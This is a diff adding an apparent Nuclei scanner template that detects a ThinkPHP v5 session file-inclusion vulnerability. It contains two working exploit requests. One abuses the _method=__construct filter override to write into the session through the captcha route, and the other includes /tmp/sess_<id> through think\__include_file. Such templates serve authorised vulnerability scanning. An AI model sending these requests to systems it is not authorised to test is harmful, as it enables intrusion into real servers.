@@ -1,0 +1,46 @@
+id: poc-local-thinkphp-v5-session-file-include-index-captcha
+
+info:
+  name: poc-local-thinkphp-v5-session-file-include-index-captcha
+  author: capiton
+  severity: high
+  description: ""
+  reference: 
+    - https://github.com/bewhale/thinkphp_gui_tools
+  tags: thinkphp
+
+variables:
+  cookie_value: "{{to_lower(rand_text_alpha(25))}}"
+
+requests:
+  - raw:
+      - |-
+        POST /index.php?s=captcha HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Cache-Control: no-cache
+        Content-Type: application/x-www-form-urlencoded
+        Pragma: no-cache
+        Cookie: PHPSESSID={{cookie_value}}
+
+        _method=__construct&filter[]=think\Session::set&method=get&get[]=test&server[]=1
+    
+      - |-
+        POST /index.php?s=captcha HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Cache-Control: no-cache
+        Content-Type: application/x-www-form-urlencoded
+        Pragma: no-cache
+        Cookie: PHPSESSID={{cookie_value}}
+
+        _method=__construct&method=GET&filter[]=think\__include_file&get[]=/tmp/sess_{{cookie_value}}&server[]=1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "think|a:"
+
+
